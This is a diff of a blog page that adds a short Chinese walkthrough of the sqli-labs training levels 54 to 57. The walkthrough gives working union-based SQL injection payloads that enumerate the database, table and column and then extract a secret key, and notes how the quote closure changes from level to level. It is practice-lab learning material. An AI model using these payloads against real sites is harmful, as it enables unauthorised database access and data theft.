@@ -159,7 +159,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/01/20/article-title-16/" class="post-title-link" itemprop="url">article title</a>
+            <a href="/2021/01/20/article-title-16/" class="post-title-link" itemprop="url">sqli-labs练习(第五十四-五十七关)</a>
         </h2>
 
         <div class="post-meta">
@@ -171,6 +171,13 @@
 
               <time title="创建时间：2021-01-20 11:23:14" itemprop="dateCreated datePublished" datetime="2021-01-20T11:23:14+08:00">2021-01-20</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-21 21:33:05" itemprop="dateModified" datetime="2021-01-21T21:33:05+08:00">2021-01-21</time>
+              </span>
 
           
 
@@ -183,7 +190,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          
+          <h4 id="五十四关"><a href="#五十四关" class="headerlink" title="五十四关"></a>五十四关</h4><p>这一关我们有十次尝试的机会可以获得key，首先是判断闭合符，此关的闭合符为单引号<code>&#39;</code>，接下来查字段，再用联合查询语句<code>?id=-1&#39; union select 1,2,database() --+</code>,可以获得名为<code>challenges</code>的数据库，接着在数据库查表<code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39; --+</code>，获得表名<code>n54k7bqnjf</code>，接着是列名<code>secret_5SL2</code>，最好用语句<code>?id=-1&#39; union select 1,2,group_concat(concat_ws(0x7e,secret_5SL2)) from n54k7bqnjf --+</code>获得key<code>0DmDjzGixMOWr99FChzyBstJ</code>成功提交！</p>
+<h4 id="五十五关"><a href="#五十五关" class="headerlink" title="五十五关"></a>五十五关</h4><p>闭合符改为<code>()</code>,其他步骤与上一关一样。</p>
+<h4 id="五十六关"><a href="#五十六关" class="headerlink" title="五十六关"></a>五十六关</h4><p>闭合符为<code>&#39;)</code>,其他步骤相同。</p>
+<h4 id="五十七关"><a href="#五十七关" class="headerlink" title="五十七关"></a>五十七关</h4><p>闭合符为<code>&quot;</code>,其他步骤相同。</p>
+
       
     </div>
 
